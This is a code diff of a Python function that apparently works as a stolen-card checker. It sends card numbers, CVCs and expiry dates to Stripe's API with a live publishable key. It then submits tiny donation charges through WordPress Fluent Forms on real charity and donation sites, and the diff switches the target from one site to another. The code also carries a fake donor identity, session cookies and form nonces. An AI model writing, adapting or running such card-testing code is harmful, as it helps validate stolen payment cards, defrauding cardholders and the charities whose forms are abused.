@@ -26,25 +26,26 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&key=pk_live_51P3NpSLxkq1DmcIzN7Q0oc425vK4pBk0uHWpsCQUdZvTOZFjzNKPzQ7tesjTo9JbkDMKkIOcYgEg231A2zzg2KCQ00yW9qeFoV'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&referrer=https%3A%2F%2Fwww.aaronabke.com&time_on_page=52825&key=pk_live_51GGaWMAJSPmZlL2afbQZDpv2vTIB3894XGGxamKUqTCkHjOi5xT0xBMn8GYDCIiWqs2T6mFpst5ZwqnwlJzghdDC00HIeZ9lw8'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '99244f4b-124d-4365-a53e-94dfd94f1fa79b2c81',
-	    '__stripe_sid': '9e424b1f-643d-41f3-b5d0-a3504cbb927fadbdec',
+	    'cookie_notice_accepted': 'true',
+	    '__stripe_mid': '65f075b0-bfc5-4647-b478-3594b195d66e3459f5',
+	    '__stripe_sid': '04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
 	}
 	
 	headers = {
-	    'authority': 'emanuil.bg',
+	    'authority': 'www.aaronabke.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=99244f4b-124d-4365-a53e-94dfd94f1fa79b2c81; __stripe_sid=9e424b1f-643d-41f3-b5d0-a3504cbb927fadbdec',
-	    'origin': 'https://emanuil.bg',
-	    'referer': 'https://emanuil.bg/darenie/',
+	    # 'cookie': 'cookie_notice_accepted=true; __stripe_mid=65f075b0-bfc5-4647-b478-3594b195d66e3459f5; __stripe_sid=04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
+	    'origin': 'https://www.aaronabke.com',
+	    'referer': 'https://www.aaronabke.com/donate/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -56,16 +57,22 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744904897713',
+	    't': '1744935267616',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=17&_fluentform_5_fluentformnonce=fb9a23e3a7&_wp_http_referer=%2Fdarenie%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&dropdown=%D0%9E%D0%B1%D1%89%D0%BE%20%D0%B4%D0%B0%D1%80%D0%B5%D0%BD%D0%B8%D0%B5&payment_input=%D0%98%D1%81%D0%BA%D0%B0%D0%BC%20%D0%B4%D0%B0%20%D0%B2%D1%8A%D0%B2%D0%B5%D0%B4%D0%B0%20%D1%81%D1%83%D0%BC%D0%B0%20%D0%BF%D0%BE%20%D0%B8%D0%B7%D0%B1%D0%BE%D1%80&custom-payment-amount=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': 'item_4__fluent_sf=&__fluent_form_embded_post_id=884&_fluentform_4_fluentformnonce=a458ecc2cf&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&custom-payment-amount=0.50&payment_input=0&payment_input_custom_0=0&payment_input_custom_1=&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '5',
+	    'form_id': '4',
 	}
 	
-	r2 = requests.post('https://emanuil.bg/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
+	r2 = requests.post(
+	    'https://www.aaronabke.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	return (r2.json())
 	
